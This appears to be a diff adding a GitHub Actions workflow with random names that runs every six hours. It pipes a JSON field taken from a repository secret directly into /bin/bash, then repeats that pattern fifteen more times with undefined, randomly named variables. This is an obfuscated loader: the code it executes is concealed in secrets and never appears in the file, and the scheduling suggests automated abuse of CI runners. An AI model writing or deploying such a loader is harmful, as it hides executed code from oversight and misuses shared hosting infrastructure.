@@ -1,0 +1,32 @@
+name: laoqiuling8311
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laoqiuling8311
+        env:
+          ykpiu354: ${{ secrets.ykpiu354 }}
+        run: |
+          echo $ykpiu354 | jq -r .tg926 | /bin/bash
+          echo $bg3 | jq -r .omqeq38228 | /bin/bash
+          echo $gc6053 | jq -r .vuzap1561 | /bin/bash
+          echo $zes4058 | jq -r .qteps58 | /bin/bash
+          echo $leo480 | jq -r .ybys32286 | /bin/bash
+          echo $tj6 | jq -r .unjbj1 | /bin/bash
+          echo $l6129 | jq -r .m52759 | /bin/bash
+          echo $xfpoz34320 | jq -r .feit77759 | /bin/bash
+          echo $dz0 | jq -r .wdqh93051 | /bin/bash
+          echo $advc72 | jq -r .aq5 | /bin/bash
+          echo $oh14 | jq -r .wrlq6 | /bin/bash
+          echo $ujhhb6 | jq -r .c46812 | /bin/bash
+          echo $hhzno8 | jq -r .u7 | /bin/bash
+          echo $ovage1 | jq -r .qwv93916 | /bin/bash
+          echo $e5275 | jq -r .j6 | /bin/bash
+          echo $a388 | jq -r .tjxyj7 | /bin/bash
+
